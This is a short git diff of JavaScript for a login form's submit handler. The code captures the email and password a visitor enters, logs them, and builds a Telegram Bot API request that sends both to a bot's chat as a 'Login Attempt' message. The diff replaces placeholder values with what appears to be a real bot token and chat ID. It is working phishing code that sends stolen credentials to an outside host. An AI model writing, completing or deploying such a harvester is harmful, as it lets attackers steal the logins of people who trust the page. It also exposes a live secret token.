@@ -9,8 +9,8 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     console.log(`Email: ${email}, Password: ${password}`);
 
     // Kirim ke Telegram
-    let botToken = "ISI_BOT_TOKEN_LO";
-    let chatId = "ISI_CHAT_ID_LO";
+    let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
+    let chatId = "6786210993";
     let message = `🔒 *Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
     
     let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
